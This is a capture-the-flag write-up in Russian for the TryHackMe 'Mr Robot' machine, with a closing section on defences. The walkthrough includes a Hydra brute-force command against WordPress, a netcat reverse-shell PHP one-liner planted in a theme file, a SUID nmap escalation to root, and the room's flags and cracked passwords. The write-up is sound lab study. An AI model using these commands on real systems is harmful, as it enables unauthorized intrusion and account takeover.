Вот твой отчёт, полностью оформленный под указанный шаблон:

# Mr Robot

**Сложность:** Medium
<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/de6e77f9-0de0-4adf-a407-9cd45f348b75" />

|  |  |
| --- | --- |
| **Платформа** | TryHackMe |
| **Ссылка** | https://tryhackme.com/room/mrrobot |
| **ОС** | Linux |
| **Теги** | `wordpress`, `dictionary-attack`, `suid`, `nmap` |

## Кратко

Машина по мотивам сериала «Мистер Робот». Цепочка атаки: анализ файла `robots.txt` → перебор паролей WordPress по кастомному словарю с помощью Hydra → получение реверс-шелла через редактирование темы `404.php` → взлом MD5-хэша пользователя `robot` → повышение привилегий до `root` через уязвимый SUID-бинарник `nmap` в интерактивном режиме.

## 1. Разведка

### Сканирование портов

```bash
nmap -sC -sV 10.82.190.113

```

```
PORT    STATE  SERVICE  VERSION
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

```

Первичное сканирование показало, что открыты только HTTP и HTTPS порты. Порты могли отображаться как закрытые во время запускa машины, но сканирование веб-сервисов подтвердило наличие веб-приложения.

### Перечисление сервисов

Сканирование директорий с помощью `gobuster` показало наличие формы авторизации WordPress (`/wp-login.php`). При проверке файла `robots.txt` были обнаружены ссылки на первый ключ и словарь:

```
User-agent: *
fsociety.dic
key-1-of-3.txt

```

Первый флаг был получен из файла `key-1-of-3.txt`. Из файла `fsociety.dic` был загружен словарь для перебора, который содержал множественные дубликаты. Файл был очищен от повторов с помощью Python-скрипта в итоговый словарь `clean_users.txt`.

В форме входа WordPress подтверждено существование пользователя `Elliot` по изменению ошибки с «invalid username» на «incorrect password for username elliot».

## 2. Получение доступа

Перебор паролей для пользователя `Elliot` выполнялся утилитой Hydra:

```bash
hydra -l Elliot -P clean_users.txt 10.82.190.113 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30

```

```
[80][http-post-form] host: 10.82.190.113   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found

```

После авторизации в панели WordPress открыт раздел **Appearance -> Editor** и отредактирован шаблон страницы `404.php` — в него вставлен код PHP reverse shell:

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>

```

После запуска слушателя `nc -lnvp 8000` на локальной машине и обращения к `/404.php` был получен доступ к целевой системе.

В директории `/home/robot` обнаружен файл с MD5-хэшем:

```bash
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

```

Хэш `c3fcd3d76192e4007dfb496cca67e13b` дешифрован через CrackStation в значение `abcdefghijklmnopqrstuvwxyz`. Авторизация под пользователем `robot`:

```bash
$ su robot
Password: abcdefghijklmnopqrstuvwxyz
$ cat /home/robot/key-2-of-3.txt
822c73956184f694993bede3eb39f959

```

**Флаг пользователя:** `822c73956184f694993bede3eb39f959` *(учитывая key-1: `07385200251c8231558635f77554db08`)*

## 3. Повышение привилегий

Поиск бинарников с установленным SUID-битом:

```bash
find / -perm -4000 2>/dev/null

```

В выводе обнаружен утилита Nmap старой версии (3.81). В данной версии доступен интерактивный режим `--interactive`, позволяющий выполнять команды с правами владельца файла (`root`):

```bash
robot@ip-10-82-190-113:/home$ nmap --interactive
nmap> !/bin/sh
$ whoami
root
$ cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4

```

**Флаг root:** `04787ddef27c3dee1ee161b21670b4e4`

## Выводы

* **Уязвимости:** Публикация чувствительных файлов в `robots.txt`, использование перебираемых учетных данных (слабый пароль WordPress), хранение пароля в MD5 без соли, установленный SUID-бит на устаревшей версии Nmap.
* **Как предотвратить:** Исключить из `robots.txt` имена файлов с ключами и словарями, ограничить попытки входа в WordPress (Fail2Ban/Captcha), отключить редактирование темы из административной панели (`DISALLOW_FILE_EDIT`), использовать стойкие алгоритмы хэширования (bcrypt/Argon2) и убрать SUID-бит у бинарников, имеющих функционал shell-escapes.
* **Чему научился:** Эффективной оптимизации больших словарей, подбору паролей веб-форм через Hydra и эксплуатации legacy-функций SUID бинарников (Nmap Interactive Mode).

## Использованные инструменты

`nmap`, `gobuster`, `hydra`, `netcat`, `python`
